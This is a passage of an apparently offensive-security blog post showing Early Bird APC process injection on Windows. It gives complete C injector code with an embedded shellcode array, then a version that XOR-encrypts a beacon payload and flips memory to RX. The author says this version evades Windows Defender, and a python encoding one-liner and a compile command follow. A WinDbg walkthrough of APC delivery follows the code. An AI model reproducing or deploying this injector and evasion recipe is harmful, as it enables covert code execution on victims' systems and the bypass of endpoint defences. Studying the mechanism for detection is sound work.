+<span style="color:#4ade80">"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span>
+<span style="color:#4ade80">"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"</span>
+<span style="color:#4ade80">"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"</span>
+<span style="color:#4ade80">"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x17"</span>
+<span style="color:#4ade80">"\x00\x00\x00\x48\x65\x6c\x6c\x6f\x20\x66\x72\x6f\x6d\x20"</span>
+<span style="color:#4ade80">"\x45\x61\x72\x6c\x79\x20\x42\x69\x72\x64\x21\x00\x5a\xe8"</span>
+<span style="color:#4ade80">"\x0e\x00\x00\x00\x41\x50\x43\x20\x49\x6e\x6a\x65\x63\x74"</span>
+<span style="color:#4ade80">"\x69\x6f\x6e\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56"</span>
+<span style="color:#4ade80">"\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5"</span>;
+
+<span style="color:#f472b6;font-weight:600">int</span> <span style="color:#d8b4fe">main</span>() {
+
+    STARTUPINFOA si = { <span style="color:#f472b6;font-weight:600">sizeof</span>(si) };
+    PROCESS_INFORMATION pi = { <span style="color:#67e8f9">0</span> };
+
+    <span style="color:#f472b6;font-weight:600">if</span> (!<span style="color:#d8b4fe">CreateProcessA</span>(
+            <span style="color:#4ade80">"C:\\Windows\\System32\\cmd.exe"</span>,
+            <span style="color:#93c5fd;font-weight:600">NULL</span>, <span style="color:#93c5fd;font-weight:600">NULL</span>, <span style="color:#93c5fd;font-weight:600">NULL</span>,
+            FALSE,
+            CREATE_SUSPENDED,
+            <span style="color:#93c5fd;font-weight:600">NULL</span>, <span style="color:#93c5fd;font-weight:600">NULL</span>,
+            &amp;si, &amp;pi))
+    {
+        <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[-] CreateProcess failed: %lu\n"</span>, <span style="color:#d8b4fe">GetLastError</span>());
+        <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">1</span>;
+    }
+
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] cmd.exe created suspended. PID: %lu\n"</span>, pi.dwProcessId);
+
+    SIZE_T shellSize = <span style="color:#f472b6;font-weight:600">sizeof</span>(buf);
+
+    LPVOID shellAddress = <span style="color:#d8b4fe">VirtualAllocEx</span>(
+        pi.hProcess,
+        <span style="color:#93c5fd;font-weight:600">NULL</span>,
+        shellSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    <span style="color:#f472b6;font-weight:600">if</span> (!shellAddress) {
+        <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[-] VirtualAllocEx failed: %lu\n"</span>, <span style="color:#d8b4fe">GetLastError</span>());
+        <span style="color:#d8b4fe">TerminateProcess</span>(pi.hProcess, <span style="color:#67e8f9">1</span>);
+        <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">1</span>;
+    }
+
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] Shellcode memory allocated at: %p\n"</span>, shellAddress);
+
+    SIZE_T bytesWritten = <span style="color:#67e8f9">0</span>;
+
+    <span style="color:#f472b6;font-weight:600">if</span> (!<span style="color:#d8b4fe">WriteProcessMemory</span>(pi.hProcess, shellAddress, buf, shellSize, &amp;bytesWritten)) {
+        <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[-] WriteProcessMemory failed: %lu\n"</span>, <span style="color:#d8b4fe">GetLastError</span>());
+        <span style="color:#d8b4fe">TerminateProcess</span>(pi.hProcess, <span style="color:#67e8f9">1</span>);
+        <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">1</span>;
+    }
+
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] Wrote %zu bytes of shellcode\n"</span>, bytesWritten);
+
+    <span style="color:#f472b6;font-weight:600">if</span> (!<span style="color:#d8b4fe">QueueUserAPC</span>((PAPCFUNC)shellAddress, pi.hThread, (ULONG_PTR)<span style="color:#93c5fd;font-weight:600">NULL</span>)) {
+        <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[-] QueueUserAPC failed: %lu\n"</span>, <span style="color:#d8b4fe">GetLastError</span>());
+        <span style="color:#d8b4fe">TerminateProcess</span>(pi.hProcess, <span style="color:#67e8f9">1</span>);
+        <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">1</span>;
+    }
+
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] APC queued to main thread\n"</span>);
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[*] Press ENTER to resume...\n"</span>);
+    <span style="color:#d8b4fe">getchar</span>();
+
+    <span style="color:#d8b4fe">ResumeThread</span>(pi.hThread);
+
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] Thread resumed. MessageBox executing inside cmd.exe\n"</span>);
+
+    <span style="color:#d8b4fe">CloseHandle</span>(pi.hThread);
+    <span style="color:#d8b4fe">CloseHandle</span>(pi.hProcess);
+
+    <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">0</span>;
+}</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">We can also put Windows Stageless payload.</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed"><img src="https://at0mxploit.xyz/posts/img/apc-stageless.png" alt="" class="block my-8 mx-auto max-w-full h-auto border-4 border-black shadow-[8px_8px_0px_0px_rgba(0,0,0,1)]" loading="lazy"></p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">If we normally do it the Window's defender will detect with so we can include XOR encryption on the output shellcode and RW to RX flip. P.S also changed to <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">notepad.exe</code> for less making it less SUS.</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-bash font-mono text-sm"><span style="color:#fde047">python3</span> -c <span style="color:#4ade80">"data=open('updatex64.bin','rb').read();key=0xAA;enc=bytes(b^key for b in data);print('unsigned char buf[] = {');print(', '.join(hex(b) for b in enc));print('};');print(f'unsigned int buf_len = {len(enc)};')"</span> &gt; shellcode.h</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">Full code (with <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">shellcode.h</code>):</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-cpp font-mono text-sm"><span style="color:#9ca3af;font-style:italic">#define _WIN32_WINNT 0x0600</span>
+
+<span style="color:#9ca3af;font-style:italic">#include &lt;windows.h&gt;</span>
+<span style="color:#9ca3af;font-style:italic">#include &lt;stdio.h&gt;</span>
+<span style="color:#9ca3af;font-style:italic">#include "shellcode.h"</span>
+
+<span style="color:#9ca3af;font-style:italic">#define XOR_KEY 0xAA</span>
+
+<span style="color:#f472b6;font-weight:600">void</span> <span style="color:#d8b4fe">xor_decrypt</span>(<span style="color:#f472b6;font-weight:600">unsigned</span> <span style="color:#f472b6;font-weight:600">char</span> *data, <span style="color:#f472b6;font-weight:600">unsigned</span> <span style="color:#f472b6;font-weight:600">int</span> len) {
+    <span style="color:#f472b6;font-weight:600">for</span> (<span style="color:#f472b6;font-weight:600">unsigned</span> <span style="color:#f472b6;font-weight:600">int</span> i = <span style="color:#67e8f9">0</span>; i &lt; len; i++)
+        data[i] ^= XOR_KEY;
+}
+
+<span style="color:#f472b6;font-weight:600">int</span> <span style="color:#d8b4fe">main</span>() {
+
+    <span style="color:#d8b4fe">xor_decrypt</span>(buf, buf_len);
+
+    STARTUPINFOA si = { <span style="color:#f472b6;font-weight:600">sizeof</span>(si) };
+    PROCESS_INFORMATION pi = { <span style="color:#67e8f9">0</span> };
+
+    <span style="color:#f472b6;font-weight:600">if</span> (!<span style="color:#d8b4fe">CreateProcessA</span>(
+            <span style="color:#4ade80">"C:\\Windows\\System32\\notepad.exe"</span>,
+            NULL, NULL, NULL,
+            FALSE,
+            CREATE_SUSPENDED,
+            NULL, NULL,
+            &amp;si, &amp;pi))
+    {
+        <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[-] CreateProcess failed: %lu\n"</span>, <span style="color:#d8b4fe">GetLastError</span>());
+        <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">1</span>;
+    }
+
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] notepad.exe created suspended. PID: %lu\n"</span>, pi.dwProcessId);
+
+    LPVOID shellAddress = <span style="color:#d8b4fe">VirtualAllocEx</span>(
+        pi.hProcess,
+        NULL,
+        buf_len,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+
+    <span style="color:#f472b6;font-weight:600">if</span> (!shellAddress) {
+        <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[-] VirtualAllocEx failed: %lu\n"</span>, <span style="color:#d8b4fe">GetLastError</span>());
+        <span style="color:#d8b4fe">TerminateProcess</span>(pi.hProcess, <span style="color:#67e8f9">1</span>);
+        <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">1</span>;
+    }
+
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] Shellcode memory allocated at: %p\n"</span>, shellAddress);
+
+    SIZE_T bytesWritten = <span style="color:#67e8f9">0</span>;
+
+    <span style="color:#f472b6;font-weight:600">if</span> (!<span style="color:#d8b4fe">WriteProcessMemory</span>(pi.hProcess, shellAddress, buf, buf_len, &amp;bytesWritten)) {
+        <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[-] WriteProcessMemory failed: %lu\n"</span>, <span style="color:#d8b4fe">GetLastError</span>());
+        <span style="color:#d8b4fe">TerminateProcess</span>(pi.hProcess, <span style="color:#67e8f9">1</span>);
+        <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">1</span>;
+    }
+
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] Wrote %u bytes of shellcode\n"</span>, buf_len);
+
+    DWORD oldProtect = <span style="color:#67e8f9">0</span>;
+    <span style="color:#f472b6;font-weight:600">if</span> (!<span style="color:#d8b4fe">VirtualProtectEx</span>(pi.hProcess, shellAddress, buf_len, PAGE_EXECUTE_READ, &amp;oldProtect)) {
+        <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[-] VirtualProtectEx failed: %lu\n"</span>, <span style="color:#d8b4fe">GetLastError</span>());
+        <span style="color:#d8b4fe">TerminateProcess</span>(pi.hProcess, <span style="color:#67e8f9">1</span>);
+        <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">1</span>;
+    }
+
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] Memory flipped to RX\n"</span>);
+
+    <span style="color:#f472b6;font-weight:600">if</span> (!<span style="color:#d8b4fe">QueueUserAPC</span>((PAPCFUNC)shellAddress, pi.hThread, (ULONG_PTR)NULL)) {
+        <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[-] QueueUserAPC failed: %lu\n"</span>, <span style="color:#d8b4fe">GetLastError</span>());
+        <span style="color:#d8b4fe">TerminateProcess</span>(pi.hProcess, <span style="color:#67e8f9">1</span>);
+        <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">1</span>;
+    }
+
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] APC queued to main thread\n"</span>);
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[*] Press ENTER to resume...\n"</span>);
+    <span style="color:#d8b4fe">getchar</span>();
+
+    <span style="color:#d8b4fe">ResumeThread</span>(pi.hThread);
+
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] Thread resumed. Beacon executing inside notepad.exe\n"</span>);
+
+    <span style="color:#d8b4fe">CloseHandle</span>(pi.hThread);
+    <span style="color:#d8b4fe">CloseHandle</span>(pi.hProcess);
+
+    <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">0</span>;
+}</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">Then compile:</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-bash font-mono text-sm">x86_64-w64-mingw32-g++ EarlyBird.cpp -o EarlyBird.exe -static</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">Now if you compile and run it, WinDefender won't detect it and you get beacon.</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed"><img src="https://at0mxploit.xyz/posts/img/apc-beacon.png" alt="" class="block my-8 mx-auto max-w-full h-auto border-4 border-black shadow-[8px_8px_0px_0px_rgba(0,0,0,1)]" loading="lazy"></p><h1 id="debugging-with-windbg" class="text-4xl md:text-6xl font-black text-white mb-4" style="text-shadow:6px 6px 0px rgba(0,0,0,0.5)">Debugging with WinDbg</h1><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">Now for debugging we can attach the process <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">notepad.exe</code> when we run <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">EarlyBird.exe</code> in WinDbg:</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">We can list the threads using <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">~</code>:</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed"><img src="https://at0mxploit.xyz/posts/img/Windbg.png" alt="" class="block my-8 mx-auto max-w-full h-auto border-4 border-black shadow-[8px_8px_0px_0px_rgba(0,0,0,1)]" loading="lazy"></p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">Thread 0 (<code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">19a8</code>) has Suspend: 2, one suspension from <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">CREATE_SUSPENDED</code> in our injector, one added by WinDbg on attach. This is the main thread, the one our APC is queued on. All other threads have Suspend: 1, only the debugger's suspension, meaning they were already running when we attached. Each thread has a TEB address listed. Thread 0's TEB is at <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">00000095aab05000</code>, we use this later.</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed"><img src="https://at0mxploit.xyz/posts/img/Windbg2.png" alt="" class="block my-8 mx-auto max-w-full h-auto border-4 border-black shadow-[8px_8px_0px_0px_rgba(0,0,0,1)]" loading="lazy"></p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed"><code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">~0s</code> switches the active context to thread 0. WinDbg shows it's currently sitting at <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">ntdll!RtlUserThreadStart</code>, the very first function a new thread runs. This confirms the thread has executed zero instructions of notepad's own code. The APC is already queued and waiting.</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">From <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">~</code> output we saw:</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm">  <span style="color:#67e8f9">00000095</span>`aab05000  <span style="color:#67e8f9">00000000</span>`<span style="color:#67e8f9">00000000</span> <span style="color:#67e8f9">00000095</span>`aa9d0000
+  <span style="color:#67e8f9">00000095</span>`aab05010  <span style="color:#67e8f9">00000095</span>`aa9bf000 <span style="color:#67e8f9">00000000</span>`<span style="color:#67e8f9">00000000</span>
+  <span style="color:#67e8f9">00000095</span>`aab05020  <span style="color:#67e8f9">00000000</span>`<span style="color:#67e8f9">00001e00</span> <span style="color:#67e8f9">00000000</span>`<span style="color:#67e8f9">00000000</span>
+  <span style="color:#67e8f9">00000095</span>`aab05030  <span style="color:#67e8f9">00000095</span>`aab05000 <span style="color:#67e8f9">00000000</span>`<span style="color:#67e8f9">00000000</span>
+  <span style="color:#67e8f9">00000095</span>`aab05040  <span style="color:#67e8f9">00000000</span>`0000228c <span style="color:#67e8f9">00000000</span>`000019a8</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">At offset <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">+0x040</code> we can see two values: <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">0000228c</code> and <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">000019a8</code>. In the TEB the <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">ClientId</code> field sits at <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">+0x040</code>:</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">- <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">0x228c</code> = Process ID it matches the PID printed by EarlyBird (PID: 228c in hex = 8844 decimal) - <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">0x19a8</code> = Thread ID it matches thread 0's ID from the ~ output (19a8)</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">Now we can set the APC Breakpoint:</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-bash font-mono text-sm"><span style="color:#67e8f9">0</span>:<span style="color:#67e8f9">000</span>&gt; bp ntdll!KiUserApcDispatcher
+<span style="color:#67e8f9">0</span>:<span style="color:#67e8f9">000</span>&gt; bl
+<span style="color:#67e8f9">0</span> e Disable Clear  00007ff8`c3fd12e0  <span style="color:#67e8f9">0001</span> (<span style="color:#67e8f9">0001</span>) <span style="color:#67e8f9">0</span>:**** ntdll!KiUserApcDispatcher</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed"><code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">KiUserApcDispatcher</code> is the function Windows calls to deliver a user-mode APC to a thread. It's an exported function in <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">ntdll</code> so the breakpoint resolves without symbols.</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm"><span style="color:#67e8f9">0</span>:<span style="color:#67e8f9">000</span>&gt; g
+ModLoad: 00007ff8`c36a0000 00007ff8`c36cf000   C:\WINDOWS\System32\IMM32.DLL
+Breakpoint <span style="color:#67e8f9">0</span> hit
+ntdll!KiUserApcDispatcher:
+00007ff8`c3fd12e0 488b4c2418      mov     rcx,qword ptr [rsp+18h] ss:<span style="color:#67e8f9">00000095</span>`aa9ceee8={ntdll!<span style="color:#d8b4fe">Ordinal8 </span>(00007ff8`c3fafb10)}</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">We pressed ENTER in the EarlyBird console which triggered <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">ResumeThread</code>.  WinDbg immediately broke at <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">KiUserApcDispatcher</code>. Use <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">k</code> to see the call stack.</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm"><span style="color:#67e8f9">0</span>:<span style="color:#67e8f9">000</span>&gt; k
+ # Child-SP          RetAddr               Call Site
+<span style="color:#67e8f9">00</span> <span style="color:#67e8f9">00000095</span>`aa9ceed0 00007ff8`c3fd0dd4     ntdll!KiUserApcDispatcher
+<span style="color:#67e8f9">01</span> <span style="color:#67e8f9">00000095</span>`aa9cf428 00007ff8`c3fa60ad     ntdll!NtTestAlert+<span style="color:#67e8f9">0x14</span>
+<span style="color:#67e8f9">02</span> <span style="color:#67e8f9">00000095</span>`aa9cf430 00007ff8`c3fa5c73     ntdll!LdrInitializeThunk+<span style="color:#67e8f9">0x49d</span>
+<span style="color:#67e8f9">03</span> <span style="color:#67e8f9">00000095</span>`aa9cf4d0 00007ff8`c3fa5c1e     ntdll!LdrInitializeThunk+<span style="color:#67e8f9">0x63</span>
+<span style="color:#67e8f9">04</span> <span style="color:#67e8f9">00000095</span>`aa9cf500 <span style="color:#67e8f9">00000000</span>`<span style="color:#67e8f9">00000000</span>     ntdll!LdrInitializeThunk+<span style="color:#67e8f9">0xe</span></code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">This is the most important output of the entire session. Read it bottom to top:</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">- <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">LdrInitializeThunk</code> at frames 02–04: this is the Windows loader's thread initialization function. The thread just woke up and entered here and notepad's entry point has never been called. - <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">NtTestAlert+0x14</code> at frame 01: NtTestAlert is the syscall that checks the thread's APC queue. When a suspended thread resumes, the kernel calls <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">NtTestAlert</code> automatically which drains any pending APCs. This is what found our queued shellcode. - <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">KiUserApcDispatcher</code> at frame 00: we are here right now. Windows is in the middle of delivering the APC to the thread.</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">We can look into registers:</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm"><span style="color:#67e8f9">0</span>:<span style="color:#67e8f9">000</span>&gt; r
+rax=<span style="color:#67e8f9">0000000000000000</span> rbx=<span style="color:#67e8f9">0000000000000000</span> rcx=00007ff8c3fd12e0
+rdx=<span style="color:#67e8f9">0000000000000000</span> rsi=<span style="color:#67e8f9">0000000000000001</span> rdi=<span style="color:#67e8f9">0000000000000000</span>
+rip=00007ff8c3fd12e0 rsp=00000095aa9ceed0 rbp=<span style="color:#67e8f9">0000000000000000</span>
+ r8=00000095aa9ceed0  r9=<span style="color:#67e8f9">0000000000000000</span> r10=<span style="color:#67e8f9">0000000000000000</span>
+r11=<span style="color:#67e8f9">0000000000000246</span> r12=<span style="color:#67e8f9">0000000000002000</span> r13=00000095aa9cf550
+r14=<span style="color:#67e8f9">0000000000002000</span> r15=00000095aab05000
+iopl=<span style="color:#67e8f9">0</span>         nv up ei pl zr na po nc
+cs=<span style="color:#67e8f9">0033</span>  ss=002b  ds=002b  es=002b  fs=<span style="color:#67e8f9">0053</span>  gs=002b             efl=<span style="color:#67e8f9">00000246</span>
+ntdll!KiUserApcDispatcher:
+00007ff8`c3fd12e0 488b4c2418      mov     rcx,qword ptr [rsp+18h] ss:<span style="color:#67e8f9">00000095</span>`aa9ceee8={ntdll!<span style="color:#d8b4fe">Ordinal8 </span>(00007ff8`c3fafb10)}</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed"><code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">rip</code> <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">00007ff8c3fd12e0</code> confirms we are at the first instruction of <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">KiUserApcDispatcher</code>. <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">rcx</code> currently is also <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">00007ff8c3fd12e0</code> because dispatcher hasn't executed its first instruction yet, that instruction is what loads the actual shellcode address into RCX. So we can see the disassembly of dispatcher.</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm"><span style="color:#67e8f9">0</span>:<span style="color:#67e8f9">000</span>&gt; u @rcx
+ntdll!KiUserApcDispatcher:
+00007ff8`c3fd12e0 488b4c2418      mov     rcx,qword ptr [rsp+18h]
+00007ff8`c3fd12e5 488bc1          mov     rax,rcx
+00007ff8`c3fd12e8 4c8bcc          mov     r9,rsp
+00007ff8`c3fd12eb 48c1f902        sar     rcx,<span style="color:#67e8f9">2</span>
+00007ff8`c3fd12ef 488b542408      mov     rdx,qword ptr [rsp+<span style="color:#67e8f9">8</span>]
+00007ff8`c3fd12f4 48f7d9          neg     rcx
+00007ff8`c3fd12f7 4c8b442410      mov     r8,qword ptr [rsp+10h]
+00007ff8`c3fd12fc 480fa4c920      shld    rcx,rcx,20h</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed"><code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">mov rcx, [rsp+18h]</code> is where Windows loads the APC routine address (our shellcode) from the stack into RCX.</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">The technique is well understood by EDRs now, raw implementation like the one that bypassed defender will get caught by mature EDRs on behavioral sequencing alone. The next steps toward a real implant can involve syscall obfuscation, sleep masking and shellcode encryption (which we have done) but understanding the base mechanism at this level can make advanced topics make sense.</p><hr class="border-0 h-1 bg-gradient-to-r from-pink-400 via-yellow-400 to-blue-400 my-10"></div>
+        </div>
+        <section class="mt-12" data-comments-section="">
+          <div class="bg-gray-900/40 border-4 border-black p-6 md:p-8 shadow-[8px_8px_0px_0px_rgba(0,0,0,1)]">
+            <h2 class="text-2xl md:text-3xl font-black text-white mb-5" style="text-shadow:4px 4px 0px rgba(0,0,0,0.4)">COMMENTS</h2>
+            <div data-giscus-host=""><div class="giscus"><div class="giscus-frame giscus-frame--loading" title="Comments" scrolling="no" allow="clipboard-write" src="cid:frame-2EA041B1CFA8905AD709CF5F1BCBA00E@mhtml.blink" loading="lazy" style="opacity: 0;" data-original-tag="iframe"></div></div></div>
+          </div>
+        </section>
+        
+    <section class="mt-12" data-related-posts="">
+      <div class="bg-gray-900/55 border-6 border-black p-7 md:p-10 shadow-[10px_10px_0px_0px_rgba(0,0,0,1)]">
+        <div class="mb-8">
+          <h2 class="text-3xl md:text-4xl font-black text-white" style="text-shadow:4px 4px 0px rgba(0,0,0,0.4)">RELATED POSTS</h2>
+        </div>
+        <div class="space-y-8 md:space-y-10">
+          
+            <a href="https://at0mxploit.xyz/post/process-hollowing-and-base-relocations" data-post-link="process-hollowing-and-base-relocations" data-related-link="" class="group relative block bg-gray-900/60 border-8 border-black p-8 md:p-10 hover:bg-gray-900/80 transition-all hover:scale-[1.01] animate-fade-in shadow-[10px_10px_0px_0px_rgba(0,0,0,1)]">
+              <div class="relative z-10 flex items-start gap-6">
+                <div class="flex-1">
+                <div class="flex items-center gap-3 mb-5 flex-wrap">
+                  <div class="bg-black border-2 border-white px-3 py-1">
+                    <span class="text-white font-black text-xs uppercase">2 shared tags</span>
+                  </div>
+                  <div class="bg-pink-400 border-4 border-black px-3 py-1 rotate-[-2deg]">
+                    <span class="text-black font-black text-xs uppercase">Blogs</span>
+                  </div>
+                </div>
+                <h3 class="text-2xl md:text-3xl font-black text-white mb-4 leading-tight group-hover:scale-[1.01] transition-transform" style="text-shadow:3px 3px 0px rgba(0,0,0,0.5)">Process Hollowing and Base Relocations</h3>
+                <p class="text-base text-gray-200 font-bold leading-relaxed">A deep dive into process hollowing covering entry-point shellcode overwrite and full PE replacement with relocation handling.</p>
+                </div>
+                <div class="flex-shrink-0 bg-pink-400 border-4 border-black w-14 h-14 flex items-center justify-center group-hover:scale-110 group-hover:rotate-12 transition-all shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
+                  <span class="text-black font-black text-2xl">→</span>
+                </div>
+              </div>
+            </a>
+          
+            <a href="https://at0mxploit.xyz/post/reclaiming-clean-syscalls" data-post-link="reclaiming-clean-syscalls" data-related-link="" class="group relative block bg-gray-900/60 border-8 border-black p-8 md:p-10 hover:bg-gray-900/80 transition-all hover:scale-[1.01] animate-fade-in shadow-[10px_10px_0px_0px_rgba(0,0,0,1)]">
+              <div class="relative z-10 flex items-start gap-6">
+                <div class="flex-1">
+                <div class="flex items-center gap-3 mb-5 flex-wrap">
+                  <div class="bg-black border-2 border-white px-3 py-1">
+                    <span class="text-white font-black text-xs uppercase">1 shared tag</span>
+                  </div>
+                  <div class="bg-pink-400 border-4 border-black px-3 py-1 rotate-[-2deg]">
+                    <span class="text-black font-black text-xs uppercase">Blogs</span>
+                  </div>
+                </div>
+                <h3 class="text-2xl md:text-3xl font-black text-white mb-4 leading-tight group-hover:scale-[1.01] transition-transform" style="text-shadow:3px 3px 0px rgba(0,0,0,0.5)">Reclaiming Clean Syscalls in Userland</h3>
+                <p class="text-base text-gray-200 font-bold leading-relaxed">EDRs hook Nt* functions with jmp stubs, walk the EAT to detect them, reclaim clean syscalls by loading a fresh ntdll from disk and inline stub patching.</p>
+                </div>
+                <div class="flex-shrink-0 bg-pink-400 border-4 border-black w-14 h-14 flex items-center justify-center group-hover:scale-110 group-hover:rotate-12 transition-all shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
+                  <span class="text-black font-black text-2xl">→</span>
+                </div>
+              </div>
+            </a>
+          
